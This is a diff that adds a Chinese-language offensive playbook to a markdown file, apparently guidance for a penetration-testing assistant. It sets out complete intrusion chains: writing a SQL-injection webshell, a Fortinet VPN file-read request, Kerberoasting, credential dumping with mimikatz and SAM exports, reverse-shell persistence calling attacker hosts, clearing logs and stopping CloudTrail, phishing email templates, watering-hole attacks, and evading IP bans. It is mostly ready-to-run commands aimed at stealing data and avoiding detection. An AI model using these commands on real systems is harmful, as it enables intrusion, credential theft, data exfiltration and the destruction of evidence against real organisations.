@@ -1029,6 +1029,579 @@ APP/Web有这些功能 → 背后有数据接口：
 
 ---
 
+## 🏢 内网渗透完整链路（外网→域控）
+
+### 链路1：外网webshell → 内网数据库
+
+```
+1. 外网SQL注入 → 写webshell
+sqlmap -u "URL" --os-shell
+或
+' UNION SELECT '<?php system($_GET[1]);?>' INTO OUTFILE '/var/www/shell.php'--
+
+2. webshell上传代理工具
+上传 reGeorg/Neo-reGeorg → 建立SOCKS代理
+python3 reGeorgSocksProxy.py -u http://target.com/shell.php
+
+3. 通过代理扫描内网
+proxychains nmap -sT 192.168.1.0/24 -p 3306,1433,5432,27017
+
+4. 发现数据库直连
+proxychains mysql -h 192.168.1.100 -u root -p（弱口令）
+
+5. 导出数据
+mysqldump -h 192.168.1.100 -u root -pPassword 数据库 > dump.sql
+```
+
+### 链路2：VPN → 内网 → 域控 → 数据库
+
+```
+1. VPN漏洞利用 → 拿到VPN账号
+Fortinet CVE → 读取账号密码
+curl -k "https://vpn/remote/fgt_lang?lang=/../../../dev/cmdb/sslvpn_websession"
+
+2. 登录VPN → 进入内网
+使用泄露的账号登录VPN
+
+3. 扫描内网
+fscan -h 192.168.1.0/24
+
+4. 发现域控（优先目标）
+nmap -p 88,389,636,3268,3269 192.168.1.0/24
+
+5. 域用户枚举
+GetADUsers.py -all -dc-ip 192.168.1.10 domain.local/user:pass
+
+6. Kerberoasting
+GetUserSPNs.py domain.local/user:pass -dc-ip 192.168.1.10 -request
+
+7. 爆破hash → 拿到域管
+hashcat -m 13100 hashes.txt wordlist.txt
+
+8. 域管权限 → 访问所有主机
+wmiexec.py domain/admin:pass@192.168.1.100
+psexec.py domain/admin:pass@192.168.1.100
+
+9. 导出域内所有数据库
+for ip in 192.168.1.{1..254}; do
+    mysqldump -h $ip -u sa -p域管密码 --all-databases
+done
+```
+
+### 链路3：APP逆向 → API → 内网API → 数据库
+
+```
+1. APP逆向 → 发现内网API
+jadx app.apk | grep "192.168\|10.0\|172.16"
+
+2. Frida Hook → 拿Token
+Hook OkHttp → 记录内网API请求和Token
+
+3. 直接访问内网API（如果能出网）
+curl http://192.168.1.100/api/database -H "Auth: token"
+
+4. 内网API可能直连数据库
+测试: /api/query?sql=SELECT * FROM users
+
+5. SQL注入 → 导出数据
+sqlmap -u "http://192.168.1.100/api/query?sql=xxx"
+```
+
+---
+
+## 🔑 凭证收集和复用（快速扩大战果）
+
+### 凭证收集优先级
+
+**拿到Linux shell立即收集：**
+```bash
+# 1. SSH密钥（最高价值）
+cat ~/.ssh/id_rsa
+cat /root/.ssh/id_rsa
+cat /home/*/.ssh/id_rsa
+
+# 2. 配置文件中的密码
+grep -r "password\|passwd\|pwd" /var/www/ /etc/ /opt/
+grep -r "api_key\|secret\|token" /var/www/ /opt/
+
+# 3. 历史命令
+cat ~/.bash_history | grep -i "password\|mysql\|ssh"
+
+# 4. 数据库配置
+cat /var/www/html/config.php | grep -i "db_pass\|password"
+cat /etc/mysql/my.cnf
+
+# 5. 环境变量
+env | grep -i "pass\|key\|token"
+
+# 6. 进程内存（如果有数据库进程）
+grep -a "password" /proc/*/environ
+
+耗时：2分钟收集完
+```
+
+**拿到Windows shell立即收集：**
+```powershell
+# 1. 浏览器密码
+LaZagne.exe browsers
+
+# 2. WiFi密码
+netsh wlan show profiles
+netsh wlan show profile name="WiFi名" key=clear
+
+# 3. 凭证管理器
+cmdkey /list
+mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
+
+# 4. SAM数据库
+reg save HKLM\SAM sam.hive
+reg save HKLM\SYSTEM system.hive
+
+# 5. 配置文件
+findstr /s /i "password" C:\*.config C:\*.xml C:\*.txt
+
+耗时：3分钟收集完
+```
+
+### 凭证复用策略
+
+```
+收集到密码 → 立即测试：
+1. SSH到其他主机（同一密码）
+2. 数据库连接（用户名密码复用）
+3. VPN登录（员工账号复用）
+4. 邮箱登录（密码复用）
+5. 管理后台（同一套凭证）
+
+成功率：
+- 相同用户名+密码：60-80%成功率
+- 域账号：80-90%可以访问多台主机
+- 数据库密码：50%可访问其他数据库
+
+策略：
+收集1个凭证 → 测试10个目标
+平均成功3-5个 → 快速扩大战果
+```
+
+---
+
+## 🔐 持久化手法（保持权限）
+
+### Linux持久化（5分钟布置）
+
+```bash
+# 1. SSH密钥（最隐蔽）
+mkdir -p ~/.ssh
+echo "攻击者公钥" >> ~/.ssh/authorized_keys
+chmod 600 ~/.ssh/authorized_keys
+
+# 2. Crontab定时任务
+(crontab -l; echo "*/10 * * * * bash -i >& /dev/tcp/attacker/4444 0>&1") | crontab -
+
+# 3. .bashrc后门
+echo "bash -i >& /dev/tcp/attacker/4444 0>&1 &" >> ~/.bashrc
+
+# 4. systemd服务
+cat > /etc/systemd/system/update.service << EOF
+[Service]
+ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/attacker/4444 0>&1'
+Restart=always
+EOF
+systemctl enable update.service
+
+# 5. 预加载库（高级）
+echo "/tmp/backdoor.so" >> /etc/ld.so.preload
+```
+
+### Windows持久化（5分钟布置）
+
+```powershell
+# 1. 计划任务
+schtasks /create /tn "WindowsUpdate" /tr "powershell -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" /sc minute /mo 10
+
+# 2. 注册表启动项
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Update" /t REG_SZ /d "C:\backdoor.exe"
+
+# 3. WMI事件订阅
+wmic /node:localhost /namespace:\\root\subscription PATH __EventFilter CREATE Name="Filter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
+
+# 4. DLL劫持
+复制恶意DLL到系统路径
+```
+
+---
+
+## 🧹 痕迹清理（拿完数据后）
+
+### Linux痕迹清理
+
+```bash
+# 1. 清除历史命令（最重要）
+history -c
+echo "" > ~/.bash_history
+export HISTFILE=/dev/null
+
+# 2. 清除日志
+echo "" > /var/log/auth.log
+echo "" > /var/log/apache2/access.log
+echo "" > /var/log/mysql/mysql.log
+
+# 3. 删除上传的文件
+rm -f /tmp/* /var/www/html/shell.php
+
+# 4. 清除连接记录
+echo "" > /var/log/wtmp
+echo "" > /var/log/btmp
+
+# 5. 时间戳还原（高级）
+touch -r /etc/passwd uploaded_file
+
+总耗时：1分钟
+```
+
+### Windows痕迹清理
+
+```powershell
+# 1. 清除事件日志
+Clear-EventLog -LogName Application,Security,System
+
+# 2. 清除PowerShell历史
+Remove-Item (Get-PSReadlineOption).HistorySavePath
+
+# 3. 删除预读取
+del C:\Windows\Prefetch\*.pf
+
+# 4. 清除最近文档
+del /f /q %APPDATA%\Microsoft\Windows\Recent\*
+
+总耗时：1分钟
+```
+
+---
+
+## 🆘 非常规手法（所有方法都失败时）
+
+### 手法1：时间维度攻击
+
+```
+当前版本打不进去 → 找旧版本
+1. Wayback Machine → 找历史版本
+2. 旧子域名 → dev/test/staging/old
+3. 移动端旧版本 → 下载旧APK
+4. 旧API版本 → /api/v1（可能无认证）
+
+成功率：40%旧版本有漏洞
+```
+
+### 手法2：供应链攻击
+
+```
+直接目标打不进去 → 打供应商
+1. 找第三方服务商（云服务/SaaS）
+2. 打进供应商 → 拿到目标数据
+3. 或者打进供应商 → 投毒供应链
+
+例子：
+- 目标用AWS S3 → 打S3权限配置
+- 目标用Jira → 打Jira Cloud
+- 目标用第三方API → 打第三方
+```
+
+### 手法3：社交工程
+
+```
+技术打不进去 → 钓鱼
+1. 员工邮箱收集 → LinkedIn/GitHub
+2. 构造钓鱼邮件 → 伪装IT部门
+3. 钓鱼链接 → 窃取凭证
+4. 或者钓VPN账号 → 直接进内网
+
+模板：
+主题："VPN账号即将过期，请点击链接重新激活"
+链接：https://vpn-target-com.attacker.com/login
+```
+
+### 手法4：物理接近
+
+```
+远程打不进去 → 考虑物理
+1. WiFi钓鱼（伪造公司WiFi）
+2. USB投放（钓鱼U盘）
+3. 社交接触（假扮外包/快递）
+
+成功率：高（但成本也高）
+```
+
+### 手法5：拒绝服务后利用
+
+```
+打不进去 → 先搞瘫，趁乱
+1. DDoS攻击 → 系统忙于应对
+2. 告警淹没 → 大量无害告警
+3. 趁乱渗透 → 不容易被发现
+
+注意：高风险，慎用
+```
+
+---
+
+## ☁️ 云环境特殊手法
+
+### AWS特殊打法
+
+```
+1. S3桶枚举
+aws s3 ls s3://target-bucket --no-sign-request
+aws s3 sync s3://target-bucket . --no-sign-request
+
+2. IMDS元数据攻击（如果有SSRF）
+curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+
+3. Lambda函数枚举
+aws lambda list-functions --region us-east-1
+
+4. IAM权限枚举
+aws iam get-user
+aws iam list-attached-user-policies --user-name xxx
+
+5. 云日志禁用（拿到权限后）
+aws cloudtrail stop-logging --name trail-name
+```
+
+### Azure特殊打法
+
+```
+1. Blob存储枚举
+az storage blob list --account-name target
+
+2. IMDS攻击
+curl -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+3. 订阅枚举
+az account list
+
+4. 密钥窃取
+az keyvault secret list --vault-name target-vault
+```
+
+### GCP特殊打法
+
+```
+1. Storage桶枚举
+gsutil ls gs://target-bucket
+
+2. 元数据服务
+curl "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -H "Metadata-Flavor: Google"
+
+3. IAM枚举
+gcloud projects get-iam-policy PROJECT_ID
+```
+
+---
+
+## 💀 被发现后的应急对抗
+
+### 发现被检测到的信号
+
+```
+信号1：连接突然断开 → 可能被Ban IP
+信号2：大量403/429 → 触发限流/WAF
+信号3：请求变慢 → 可能在分析流量
+信号4：Webshell失效 → 被清理
+信号5：账号被禁用 → 被发现
+
+立即行动：
+1. 换IP（代理/VPN/云服务器）
+2. 降低频率（每秒1个请求）
+3. 更换User-Agent
+4. 如果拿到数据 → 立即撤退
+5. 如果没拿到 → 换个目标
+```
+
+### 被Ban后恢复访问
+
+```
+被Ban IP后：
+1. 换IP（立即）
+   - Tor: torify curl
+   - 代理池: 轮换100个代理
+   - 云服务器: 临时VPS
+
+2. 换策略
+   - 降低频率（每10秒1个请求）
+   - 伪装流量（改UA/Referer）
+   - 换时间段（凌晨再试）
+
+3. 换入口
+   - 移动端API（可能限制宽松）
+   - 旧版本API（可能无防护）
+   - 子域名（可能不同WAF）
+```
+
+---
+
+## 🎣 社工钓鱼手法（技术打不进去时）
+
+### 钓鱼场景1：钓VPN账号
+
+```
+1. 员工邮箱收集
+   LinkedIn搜索 → @target.com邮箱
+   GitHub搜索 → 员工提交记录
+
+2. 构造钓鱼邮件
+   主题："VPN系统升级通知"
+   内容："请在24小时内登录更新密码：https://vpn-target.attacker.com"
+
+3. 钓鱼页面（完全仿真）
+   克隆真实VPN登录页面
+   记录输入的账号密码
+   跳转到真实页面（不引起怀疑）
+
+4. 拿到凭证 → 登录真实VPN
+   成功率：20-30%
+```
+
+### 钓鱼场景2：钓管理员权限
+
+```
+1. 找管理员邮箱
+   WHOIS信息/域名注册信息
+   公司官网"联系我们"
+
+2. 伪造技术支持
+   主题："紧急安全漏洞需要修复"
+   附件：恶意Office文档（宏木马）
+
+3. 宏执行 → 反弹shell
+   打开文档 → 宏执行 → CobaltStrike上线
+
+4. 管理员权限 → 访问所有系统
+```
+
+### 钓鱼场景3：水坑攻击
+
+```
+1. 找目标员工常访问的网站
+   行业论坛/技术博客
+
+2. 入侵这些网站
+   通常防护较弱
+
+3. 植入恶意JS
+   窃取Cookie/Token
+   或者植入木马
+
+4. 目标员工访问 → 被攻击
+```
+
+---
+
+## 🔬 0day挖掘快速思路
+
+### 思路1：找差异点
+
+```
+新旧版本对比 → 找新增功能 → 测试
+新功能往往测试不充分 → 容易有漏洞
+
+例子：
+- Confluence 新增功能 → CVE-2023-22515
+- Spring 新增功能 → Spring4Shell
+```
+
+### 思路2：找边界
+
+```
+不同系统交互的边界 → 容易出漏洞
+- APP和API交互 → 签名绕过
+- 前端和后端交互 → 参数污染
+- 微服务之间 → 权限绕过
+
+重点测试：
+- 参数传递（类型混淆）
+- 权限校验（是否每个服务都校验）
+- 数据验证（前端验证≠后端验证）
+```
+
+### 思路3：找冷门功能
+
+```
+少人用的功能 → 测试不充分
+- 导出功能 → XXE/SSRF
+- 上传功能 → 文件上传
+- 搜索功能 → SQL注入
+- 重置功能 → 逻辑漏洞
+- API文档生成 → 信息泄露
+
+策略：找到冷门功能 → 重点测试
+```
+
+### 思路4：Fuzz变异
+
+```
+正常请求 → 变异测试
+1. 类型变异（字符串→数字→数组→对象）
+2. 长度变异（空→超长）
+3. 特殊字符（',",<,>,%,\n,\x00）
+4. 编码变异（URL/Unicode/HTML）
+
+工具：ffuf/wfuzz/Burp Intruder
+```
+
+---
+
+## 🎯 应对时间压力（HVV/众测）
+
+### 时间紧迫时的策略
+
+**只有2小时：**
+```
+策略：只打高价值，不求完美
+1. 子域名扫描（5分钟）
+2. nuclei快扫CVE（10分钟）
+3. 发现1个能用的 → 立即利用（30分钟）
+4. 拿到权限 → 快速收集凭证（10分钟）
+5. 横向最近的高价值目标（30分钟）
+6. 导出数据 → 撤退（15分钟）
+
+不做：
+- 全端口扫描
+- 手工漏洞挖掘
+- 复杂的绕过
+- 仔细清理痕迹
+```
+
+**只有30分钟：**
+```
+策略：只打明显漏洞
+1. nuclei快扫（5分钟）
+2. 发现critical漏洞 → 直接打（10分钟）
+3. 拿到权限 → 立即导出数据（10分钟）
+4. 简单清理 → 撤退（5分钟）
+
+不做：
+- 信息收集
+- WAF绕过
+- 内网渗透
+```
+
+**只有10分钟：**
+```
+策略：打一个算一个
+1. httpx快速扫描（2分钟）
+2. 看到管理后台 → admin/admin（1分钟）
+3. 成功登录 → 找导出功能（2分钟）
+4. 导出数据 → 完成（5分钟）
+
+或者：
+1. 找到API（2分钟）
+2. 测试IDOR（1分钟）
+3. 批量爬取（7分钟）
+```
+
+---
+
 ## 🎯 标准回答模板（强制格式）
 
 ### 漏洞利用类
